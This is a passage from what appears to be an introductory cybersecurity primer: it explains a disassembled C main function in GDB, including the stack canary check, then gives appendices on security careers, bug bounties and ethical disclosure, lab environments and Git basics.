                        <div class="title">Figure 63. Stack canary placed</div>
                    </div>
                    <div class="paragraph">
                        <p>In assembly, we cannot assign directly the contents of a memory address into other memory
                            address. We must read the contents of the memory address into a register and then assign
                            that register to the other memory address. Thats why rax was used.
                            In this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov    eax,0x0</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We are assigning 0 to the lower 32 bits of the rax register. In other words, eax are the
                            lower 4 bytes of the rax register which is 64 bits. Then, the line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>xor    eax,eax</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is used to make eax equal to zero. XOR is exclusive OR. When you XOR a variable with itself,
                            the result is always zero. This is a property of the XOR operation.</p>
                    </div>
                    <div class="paragraph">
                        <p>Afterwards in this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>lea    rdi,[rip+0xfc]        # 0x555555554834</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We are assigning to rdi the string that contains the message "Enter a value :" in our
                            program. The instruction lea assigns the address in the square brackets. In contrast, mov
                            assigns the content that is located in that address. The string "Enter a value :" is located
                            in rip+0xfc. Note that GDB gives us an indication of what is the value of rip+0xfc, as a
                            comment at the right that shows 0x555555554834. In the current GDB session you started, run
                            the following command to print the string at that address:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>print (char*) 0x555555554834</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You will see as output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>$2 = 0x555555554834 &quot;Enter a value :&quot;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov    eax,0x0</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We are setting eax to 0. Note that there are not square brackets, because of that, mov
                            assigns the value at the right side directly, and not the content in the address 0. We need
                            to set eax to zero because this is the number of floating-point arguments (FP args) that we
                            will be passed to printf, which we are about to call. So, we are indicating we are not
                            passing any floating-point numbers to printf. Note that we have already set eax to zero
                            doing the XOR. Sometimes, compilers generate assembly that a human could optimize further.
                            In this line, we finally call printf, with the string "Enter a value :" as the argument :
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>call   0x5555555545e0 &lt;printf@plt&gt;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Afterwards, we are calling scanf. Remember that in C, we called scanf like this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>scanf(&quot;%d&quot;, &amp;i);</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In assembly, the next line we are executing is this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>lea    rax,[rbp-0xc]</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>[rbp-0xc] is the address of a local variable, remember that rbp is the base pointer. In
                            assembly we subtract an offset to the base pointer to access the local variable we want. In
                            [rbp-0xc] is located the variable we declared in C as int i. In other words, [rbp-0xc] is
                            the address of I. Then we have:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov    rsi,rax</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In which we assign rax to rsi. The register rsi is the source index register, which
                            determines where the information read from the keyboard goes in scanf. Since we assign the
                            address of i to that register, the user input will be assigned to i.</p>
                    </div>
                    <div class="paragraph">
                        <p>The following line calls scanf, with the arguments that are already set:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>call   0x5555555545f0 &lt;__isoc99_scanf@plt&gt;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov    eax,DWORD PTR [rbp-0xc]</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Assigns the content at [rbp-0xc], to eax. By now, [rbp-0xc], which is the spot that stores
                            the value of the variable i we declared on C, already has the value that the user input.
                            So, eax currently has the value that the user input.</p>
                    </div>
                    <div class="paragraph">
                        <p>The line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>cmp    eax,0x5</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>compares eax to 5. The result in that comparison is placed in flags that we do not see in the
                            source code and belong to a register called the control register. Those flags are the carry
                            flag, sign flag, overflow flag, and zero flag. Assembly automatically uses them to represent
                            the result of a comparison.</p>
                    </div>
                    <div class="paragraph">
                        <p>Then, in the following line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>jle    0x555555554775</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The instruction jle means Jump if Less or Equal. So, if in the result of the previous
                            comparison eax was less than or equal than 5, the execution of the program jumps to the
                            address 0x555555554775. You may have different addresses in your assembly if you compiled it
                            on your own, but the instructions are the same. In the assembly from the example, at address
                            0x555555554775, we have the following lines ( note that we kept the addresses at the left of
                            the instructions so you can verify the address you jumped to):</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>   0x0000555555554775 &lt;+91&gt;:	lea    rdi,[rip+0xda]        # 0x555555554856
   0x000055555555477c &lt;+98&gt;:	mov    eax,0x0
   0x0000555555554781 &lt;+103&gt;:	call   0x5555555545e0 &lt;printf@plt&gt;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Those lines will print the message "Less or equal than 5" in a similar manner we printed a
                            message before. Then, the next lines after the call of printf, are:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>   0000555555554786 &lt;+108&gt;:	    mov    eax,0x0
   0x000055555555478b &lt;+113&gt;:   mov    rdx,QWORD PTR [rbp-0x8]
   0x000055555555478f &lt;+117&gt;:	xor    rdx,QWORD PTR fs:0x28
   0x0000555555554798 &lt;+126&gt;:	je     0x55555555479f &lt;main+133&gt;
   0x000055555555479a &lt;+128&gt;:	call   0x5555555545d0 &lt;__stack_chk_fail@plt&gt;
   0x000055555555479f &lt;+133&gt;:   leave
   0x00005555555547a0 &lt;+134&gt;:	ret</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In the first of those lines which is:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov   eax, 0x0</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We make eax zero. Then we have:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mov   rdx, QWORD PTR [rbp-0x8]</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>That line accesses rbp-0x8, which contains the value of the stack canary. We assign that
                            value to rdx. Then at this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>xor    rdx,QWORD PTR fs:0x28</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We xor the rdx with fs:0x28. In an XOR operation, if the two elements we operate are equal,
                            the result is zero. Then, in this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>je     0x55555555479f &lt;main+133&gt;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>je means jump if equals. If the result of the XOR is zero, which would set the flags as if
                            a comparison was equal, we jump to 0x55555555479f. What we are doing at a general level in
                            the last lines, is taking the stack canary from our stack frame. Remember that the stack
                            canary was previously stored there. Now we compare it with the original value of the stack
                            canary at fs:0x28. If the value is the same, it means that the chunk of memory which was
                            holding the stack canary in the stack frame was never overwritten. If it was never
                            overwritten, we do a jump to skip this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>0x000055555555479a &lt;+128&gt;:	call   0x5555555545d0 &lt;__stack_chk_fail@plt&gt;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Which calls a function that indicates that the protection was violated. Note that the jmp
                            instruction jumps without verifying any condition. In the last two lines of the program:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>   0x000055555555479f &lt;+133&gt;:   leave
   0x00005555555547a0 &lt;+134&gt;:	ret</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The instruction leave restores the old value of the EBP that was stored in the stack. As we
                            explained, the ebp from the previous function that called the current function is stored in
                            the stack. Then, ret pops the return address from the stack and redirects the execution of
                            the program to that address. Note that a program can redirect its execution to other address
                            by assigning that address to the rip (instruction pointer). The instruction ret
                            automatically pops an address from the stack and assigns it to the instruction pointer.</p>
                    </div>
                    <div class="paragraph">
                        <p>That is the end of the main function! Stay tuned for more content on Assembly and in the
                            meantime checkout this <a
                                href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/about">great
                                online course</a> on the topic!</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_careers">Appendix A: Careers</h2>
            <div class="sectionbody">
                <h5 id="careers" class="discrete">Jeffery John</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>With all this effort learning cyber skills, you might be wondering how to use and practice them.
                        There are many different career paths in cybersecurity, and they all require different skills.
                        Some of the most common careers in cybersecurity are as analysts, engineers, and penetration
                        testers.</p>
                </div>
                <div class="paragraph">
                    <p>Organizations need people who can analyze data and find patterns, people who can design and build
                        systems, and people who can test those systems for vulnerabilities. One approach is with 'red'
                        and 'blue' teams. Red teams are offensive, and they try to break into systems. Blue teams are
                        defensive, and they try to protect systems from attacks. Both teams are important, and they work
                        together to make sure that systems are secure.</p>
                </div>
                <div class="paragraph">
                    <p>It&#8217;s also possible to pursue a career more independently, as a consultant or freelancer.
                        This can be a good option for people who want to work on their own schedule and have more
                        control over their work.</p>
                </div>
                <div class="paragraph">
                    <p>The National Security Agency (NSA) also contributes to training through the RING program -
                        Regions Investing in the Next Generation. Here&#8217;s an interactive exercise from them: <a
                            href="https://d2hie3dpn9wvbb.cloudfront.net/NSA+Ring+Project/index.html" target="_blank"
                            rel="noopener">https://d2hie3dpn9wvbb.cloudfront.net/NSA+Ring+Project/index.html</a></p>
                </div>
                <div class="sect2">
                    <h3 id="_bug_bounties">A.1. Bug Bounties</h3>
                    <div id="bounties" class="paragraph">
                        <p>One way vulnerabilities are reduced is through bug bounty programs, in which organizations
                            offer rewards to their employees or the public for finding vulnerabilities and reporting
                            them to be fixed.</p>
                    </div>
                    <div class="paragraph">
                        <p>This is beneficial to the organization because it allows them to find and fix vulnerabilities
                            before they are exploited by malicious actors. Many companies have bug bounty programs, and
                            many people are safer because of the security flaws that have been found and fixed through
                            them.</p>
                    </div>
                    <div class="paragraph">
                        <p>Bug bounty programs are also beneficial to hackers as they can earn money legitimately while
                            practicing their skills and helping others be more secure.</p>
                    </div>
                    <div class="paragraph">
                        <p>Some bug bounty programs include:</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>HackerOne: <a href="https://hackerone.com/bug-bounty-programs" target="_blank"
                                        rel="noopener">https://hackerone.com/bug-bounty-programs</a></p>
                            </li>
                            <li>
                                <p>Bugcrowd: <a href="https://www.bugcrowd.com/programs/" target="_blank"
                                        rel="noopener">https://www.bugcrowd.com/programs/</a></p>
                            </li>
                            <li>
                                <p>Mozilla: <a href="https://www.mozilla.org/en-US/security/bug-bounty/" target="_blank"
                                        rel="noopener">https://www.mozilla.org/en-US/security/bug-bounty/</a></p>
                            </li>
                        </ul>
                    </div>
                    <div class="paragraph">
                        <p>Even governments offer bounties!</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/careers1.png" alt="careers1">
                        </div>
                        <div class="title">Figure 64. NCSC-NL (National Cyber Security Centre  Netherlands) t-shirt
                            reward, <a
                                href="https://jacobriggs.io/blog/posts/i-hacked-the-dutch-government-and-all-i-got-was-this-t-shirt-24.html"
                                target="_blank" rel="noopener">Jacob Riggs</a></div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_the_cve_program">A.2. The CVE Program</h3>
                    <div id="cves" class="paragraph">
                        <p>When a vulnerability is found, it is assigned a CVE number, which is a unique identifier for
                            that vulnerability. CVE stands for Common Vulnerabilities and Exposures, and it is a list of
                            publicly known cybersecurity vulnerabilities. CVEs are assigned by the CVE Numbering
                            Authority (CNA).</p>
                    </div>
                    <div class="paragraph">
                        <p>By defining and cataloging vulnerabilities, security researchers, engineers, and analysts can
                            more easily communicate about them to each other. Imagine trying to fix a problem without
                            knowing what to call it!</p>
                    </div>
                    <div class="paragraph">
                        <p>The list of CVEs, and forms to submit or update them, can be found at <a
                                href="https://www.cve.org" target="_blank" rel="noopener">https://www.cve.org</a>.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_ethical_considerations">A.3. Ethical Considerations</h3>
                    <div id="ethical-considerations" class="paragraph">
                        <p>Before publishing a vulnerability from a bug bounty program, or as a CVE, you should consider
                            the ethical implications of doing so.</p>
                    </div>
                    <div class="paragraph">
                        <p>If a vulnerability is published before it is fixed, it could be exploited by malicious
                            actors. This could cause harm to people or organizations, as well as legal consequences for
                            the publisher. Each organization or program will have its own rules and preferences for how
                            to responsibly disclose vulnerabilities.</p>
                    </div>
                    <div class="paragraph">
                        <p>Additionally, never hack into a system without permission, or attempt to go further than
                            requested. This is illegal, and it could similarly cause harm to people or organizations.
                            Bug bounty programs will define clear scopes for what is allowed.</p>
                    </div>
                    <div class="paragraph">
                        <p>If the organization does not respond to a disclosure of a security risk to them or their
                            users within a reasonable timeframe, there may be other options such as contacting a
                            governing agency. In the United States, the Cybersecurity and Infrastructure Security Agency
                            (CISA) is a good place to start: <a
                                href="https://www.cisa.gov/coordinated-vulnerability-disclosure-process" target="_blank"
                                rel="noopener">https://www.cisa.gov/coordinated-vulnerability-disclosure-process</a>.
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>If a malicous actor is able to find and exploit an unreported vulnerability, it is known as a
                            'zero-day', because the organization has had zero days to fix it. These are considered the
                            most dangerous, and can impact millions of innocent people. Ultimately, careers in
                            cybersecurity are all about preventing these from hapening.</p>
                    </div>
                    <div class="paragraph">
                        <p>While this Primer cannot cover all the ethical considerations of reporting individual
                            vulnerabilities, it is important to consider your ability to help others through responsible
                            disclosure.</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_virtual_environment">Appendix B: Virtual Environment</h2>
            <div class="sectionbody">
                <h5 id="environments" class="discrete">Jeffery John</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>We mentioned Linux in our chapter on <a href="#_the_shell">the Shell</a>, and you may be
                        wondering what your next step is. The great thing about Linux is that it&#8217;s hard to
                        outgrow!</p>
                </div>
                <div class="paragraph">
                    <p>Linux is a family of open source systems, which are distributed as 'distros', and each has
                        strengths and weaknesses. The advantage of Linux is that the user has the power to control their
                        own device, and freely choose between distros.</p>
                </div>
                <div class="paragraph">
                    <p>Most of the world&#8217;s super computers, servers, mobile devices, and embedded systems run a
                        distro of Linux. Even the International Space Station runs Linux!</p>
                </div>
                <div class="paragraph">
                    <p>When developers and hackers choose their tools, <a href="#_tools">including many mentioned in
                            this Primer</a>, they have to consider how their hardware and software will interact. This
                        is known as their 'environment'.</p>
                </div>
                <div class="sect2">
                    <h3 id="_web">B.1. Web</h3>
                    <div class="paragraph">
                        <p>Many hacking tools are web-based, and so they&#8217;ll work on any operating system that
                            allows you to run a web browser. A good example is <a href="https://crackstation.net"
                                target="_blank" rel="noopener">CrackStation</a> which allows anyone with an internet
                            connection to check password hashes.</p>
                    </div>
                    <div class="paragraph">
                        <p>Another option is to use a remote server, which is a computer that you can access over the
                            internet. Typically, you&#8217;d own or rent this server, so you&#8217;d have more control
                            over how it&#8217;s used. This is a great way to run tools that require a lot of processing
                            power, or to run tools that you don&#8217;t want to run on your own computer due to space or
                            computing power limitations. Remote servers are often called and offered by 'cloud'
                            services, and they&#8217;re a great way to get started with hacking!</p>
                    </div>
                    <div class="paragraph">
                        <p>Note that web-based tools are often hosted on their own remote servers that they use as a
                            'backend' to process inputs and requests from the 'frontend', or the website that you can
                            interact with. Having a remote server, like an instance of Amazon Web Services, Google Cloud
                            Platform, or Azure, is unique in that you can choose the tools that are installed, the
                            capability of the server, and how accessible to the public it is.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_virtual_machines">B.2. Virtual Machines</h3>
                    <div class="paragraph">
                        <p>Virtual machines (VM) are a great way to run tools that require a specific operating system,
                            or to run multiple operating systems at once. These can be run locally, or on a remote
                            server.</p>
                    </div>
                    <div class="paragraph">
                        <p>You might sometimes hear VMs referred to as a 'box' because anything inside of one tends to
                            stay inside. You can treat a VM as if it were a separate computer - even if it&#8217;s
                            sharing hardware locally or with your remote server!</p>
                    </div>
                    <div class="paragraph">
                        <p>For example, if you use a Windows computer, you can run a virtual machine with a distro of
                            Linux to run Linux tools. You can also configure your virtual machine to be created in a
                            certain way, and then reset or share that state with others! <a href="https://podman.io/"
                                target="_blank" rel="noopener">Podman</a> is an excellent option for this, and helps
                            teams have effectively identical environments so collaboration is easy. Since hacking can
                            sometimes be very dependent on the version of a target&#8217;s hardware or software, being
                            able to practice on an exact copy is helpful. For the same reason, this is why downloading
                            security updates for your software is a good idea! Cyber teams around the world work to
                            'patch' problems and publish fixes as quickly as they can.</p>
                    </div>
                    <div class="paragraph">
                        <p>Additionally, if you&#8217;re investigating potential malware, it&#8217;s a good idea to run
                            it in a virtual machine to help protect your computer. Since the VM acts like an independent
                            computer, most malware will be contained inside it. If you run into any issues, you can
                            simply reset the virtual machine to a previous state.</p>
                    </div>
                    <div class="paragraph">
                        <p>To get started, you might be interested in <a href="https://www.virtualbox.org"
                                target="_blank" rel="noopener">VirtualBox</a>, which alows for software virtualization
                            to whatever your other tools or use cases need.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_vpns">B.3. VPNs</h3>
                    <div class="paragraph">
                        <p>When accessing a remote server, you may need a Virtual Private Network, or VPN, to connect to
                            it. This is a way to securely connect, as well as protect your privacy.</p>
                    </div>
                    <div class="paragraph">
                        <p>In this arrangement, your data will be encrypted and sent to the VPN provider, who will then
                            send it to a remote server, such as a website. If a third party intercepts your data, they
                            won&#8217;t be able to read it, and if they&#8217;re listening to your traffic, all
                            they&#8217;ll see is the connection to the VPN, rather than where you go next. Pretty handy!
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>In industry, companies often require their employees to use a company VPN to access their
                            internal network from outside the office. Just like how VPNs can protect an
                            individual&#8217;s data, they can protect a company&#8217;s sensitive information too!
                            Without a VPN, employees working remotely may be vulnerable to their credentials being
                            stolen.</p>
                    </div>
                    <div class="paragraph">
                        <p>If you choose to use a VPN, it&#8217;s important to understand that you&#8217;re trusting the
                            VPN provider with your data. If you&#8217;re working on a sensitive project, you may want to
                            vet the VPN provider to ensure that they&#8217;re trustworthy.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_authentication">B.4. Authentication</h3>
                    <div class="paragraph">
                        <p>Hackers need to worry about their own security too! When using virtual services, along with a
                            VPN, use strong passwords and multi-factor authentication whenever possible. That way, even
                            if an adversary were to steal your password from one service, they would need others in
                            order to impersonate you.</p>
                    </div>
                    <div class="paragraph">
                        <p>If you pursue cybersecurity as a career, many people may be trusting you with their data. You
                            should take this responsibility seriously, and protect your own accounts to avoid putting
                            others at risk.</p>
                    </div>
                    <div class="paragraph">
                        <p>Best practices change often, but current recommendations include using a password manager,
                            and including a hardware token for authentication. When creating a password, consider using
                            a passphrase instead, as these are generally easier to remember and harder to crack.</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/environment1.png" alt="environment1">
                        </div>
                        <div class="title">Figure 65. Password Strength, <a href="https://xkcd.com/936" target="_blank"
                                rel="noopener">xkcd.com</a></div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_ides">B.5. IDEs</h3>
                    <div class="paragraph">
                        <p>IDEs, or Integrated Development Environments, are tools that help developers write code. They
                            often include features like syntax highlighting, code completion, and debugging.</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://code.visualstudio.com/" target="_blank" rel="noopener">Visual Studio
                                Code</a> is a popular IDE that&#8217;s available for Windows, Mac, and Linux. Due to it
                            being open source, many developers are able to contribute plugins to extend its
                            functionality for specific languages or use cases.</p>
                    </div>
                    <div class="paragraph">
                        <p>An IDE can help hackers by making it easier to write code for scripts, read code from their
                            targets, and by providing tools to help them understand what code is doing.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_installations">B.6. Installations</h3>
                    <div class="paragraph">
                        <p>If you&#8217;re interested in installing a distro of Linux on your computer or on a virtual
                            machine, it&#8217;s generally a good idea to start with a popular distro so that there are
                            plenty of resources and people that may be able to help you.</p>
                    </div>
                    <div class="paragraph">
                        <p>A popular distro for beginners is <a href="https://ubuntu.com/" target="_blank"
                                rel="noopener">Ubuntu</a>, and another among hackers is <a href="https://www.kali.org/"
                                target="_blank" rel="noopener">Kali</a>. If you don&#8217;t want to install a distro,
                            you can also use a live USB, which is a USB drive that you can boot from. This is a great
                            way to try out a distro without installing it. Some, like <a href="https://tails.net"
                                target="_blank" rel="noopener">Tails</a>, are designed to use this feature to protect
                            user privacy.</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_git_version_control">Appendix C: Git &amp; Version Control</h2>
            <div class="sectionbody">
                <h5 id="_jeffery_john" class="discrete">Jeffery John</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div id="git" class="paragraph">
                    <p>As you progress through more and more cyber challenges, you may find yourself with quite the
                        collection of files!</p>
                </div>
                <div class="paragraph">
                    <p>You may also find that you want to try multiple approaches while solving a problem, or work with
                        a team. Using version control, such as Git, can save you a lot of time and effort.</p>
                </div>
                <div class="quoteblock">
                    <blockquote>
                        <div class="paragraph">
                            <p>Git is a free and open source distributed version control system designed to handle
                                everything from small to very large projects with speed and efficiency.</p>
                        </div>
                    </blockquote>
                    <div class="attribution">
                        &#8212; Git Community<br>
                        <cite>https://git-scm.com</cite>
                    </div>
                </div>
                <div class="paragraph">
                    <p>Version control is a way for developers to 'time-travel' by allowing them to save their files and
                        return to them at any point. For example, you may start making changes to your Python code, and
                        find that suddenly it doesn&#8217;t work anymore! Git would allow you to go back to a version of
                        your code that does work.</p>
                </div>
                <div class="paragraph">
                    <p>When working with teams of programmers or hackers, version control allows you to compare
                        differences, or diffs, of each file and then 'merge' your progress together. This way, multiple
                        people can work on the same problem without undoing each other&#8217;s progress!</p>
                </div>
                <div class="paragraph">
                    <p>Along with Git, other Version Control Systems (VCS) include Subversion (SVN), Sapling, and Piper.
                        Many large companies will develop or modify their VCS to fit their needs, though the basic
                        principles remain the same. With tens of thousands of employees working on the same projects,
                        some form of version control is a necessity for professionals to get work done.</p>
                </div>
                <div class="paragraph">
                    <p>Another term for VCS is Source Configuration Management (SCM). These terms can be used
                        interchangeably. However, Git and GitHub are less similar. Git is a VCS or SCM, while GitHub is
                        web-based platform for development and collaboration that uses Git. We&#8217;ll talk more about
                        GitHub later in this chapter.</p>
                </div>
                <div class="paragraph">
                    <p>You can get started with Git locally, on your computer, or remotely in the cloud like with the
                        picoCTF webshell:</p>
                </div>
                <div class="paragraph">
                    <p><a href="https://webshell.picoctf.org" target="_blank"
                            rel="noopener">https://webshell.picoctf.org</a></p>
                </div>
                <div class="sect2">
                    <h3 id="_git_started_with_git">C.1. 'Git' Started with Git</h3>
                    <div id="git-started" class="paragraph">
                        <p>To start using Git locally, make sure to download a copy for your operating system from their
                            website:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://git-scm.com/downloads" target="_blank"
                                rel="noopener">https://git-scm.com/downloads</a></p>
                    </div>
                    <div class="paragraph">
                        <p>This has already been done for you in the picoCTF webshell, and can be verified by typing
                            <code>git --version</code>.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>$ git --version</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Using a VCS takes some practice with the shell. If you feel a bit lost, you may want to touch
                            up with <a href="#_the_shell">our chapter on using one</a>.</p>
                    </div>
                    <div class="paragraph">
                        <p>Once inside a shell with Git installed, you can start, or initialize a repository with
                            <code>git init</code>. This will start 'tracking' all the files in your current folder.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git init</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>A repository, often abbreviated as a repo, is a collection of files. Version control works by
                            'tracking' changes to these files, and letting you undo or merge changes whenever you want.
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>You can now tell Git who you are with
                            <code>git config --global user.email "&lt;your email&gt;"</code> and
                            <code>git config --global user.name "&lt;your name&gt;"</code>.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git config --global user.email &quot;&lt;your email&gt;&quot;
$ git config --global user.name &quot;&lt;your name&gt;&quot;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Many video games have 'save' or 'check' points, where you can return to a point in the level
                            if you need to. In Git, 'commits' act in a very similar way. You can add, or stage, all the
                            files in your current folder with <code>git add .</code>, then commit them to be saved with
                            <code>git commit -m "&lt;your description&gt;"</code>.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git add .
$ git commit -m &quot;&lt;your description&gt;&quot;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, you can make any changes you want to the contents of your folder. You could add or
                            delete files, or change lines of code.</p>
                    </div>
                    <div class="paragraph">
                        <p>When you&#8217;re ready to go back in time, you can see your past commits with
                            <code>git log</code>. By default, this will show the author, commit ID, time, and
                            description. The commit ID will be a long series of letters and numbers. This is based on a
                            'hash' of your files. We&#8217;ll talk more about hashing later in this Primer with the <a
                                href="#_cryptography">cryptography chapter</a>. By copying the commit ID, we can time
                            travel back to that save point with <code>git checkout &lt;commit ID&gt;</code>. Pretty cool
                            right?
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git log
$ git checkout &lt;commit ID&gt;</code></pre>
                        </div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_branching">C.2. Branching</h3>
                    <div id="git-branching" class="paragraph">
                        <p>You can also create multiple 'branches' of time with the
                            <code>git branch &lt;branch name&gt;</code> command! You can see all local and remote
                            branches with <code>git branch -a</code>, and switch between them with
                            <code>git checkout &lt;branch name&gt;</code>.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>$ git branch -a
$ git checkout &lt;branch name&gt;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>When you start a repository, you&#8217;ll be on the <code>main</code> branch. This may also
                            be called the <code>trunk</code> or <code>boss</code>. If you&#8217;re working on an older
                            repository, you may see it referred to as <code>master</code>. You can rename your
                            <code>main</code> branch to whatever you&#8217;d like, but make sure that any collaborators
                            know about the change.
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>Creating multiple branches as you work is a very powerful way to keep track of what
                            you&#8217;re working on. Each branch can have its own commit history. This can be especially
                            useful for multiple people working together.</p>
                    </div>
                    <div class="paragraph">
                        <p>It&#8217;s a good habit for each person to have their own branch, and for each new feature or
                            problem to be worked on its own branch. When ready, a branch can be 'merged' or 'combined'
                            with the branch you currently have checked out with the
                            <code>git merge &lt;branch name&gt;</code> command.
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>$ git merge &lt;branch name&gt;</code></pre>
                        </div>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image50.png" alt="image50">
                        </div>
                        <div class="title">Figure 66. Scott Chacon and Ben Straub, Pro Git <a
                                href="https://git-scm.com/book/en/v2" class="bare">https://git-scm.com/book/en/v2</a>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Above is an example of a branching structure. Each commit is numbered with a prefix 'C', and
                            a branch has been created to work on a feature. 'C4' is a snapshot, or check point, of the
                            most progress on the master, or main, branch. 'C5' with commit ID "iss53" is a snapshot of
                            the most progress done for the feature. Note how 'C5' contains 'C0', 'C1', 'C2', and 'C3'
                            while 'C4' only contains 'C0', 'C1', and 'C2'.</p>
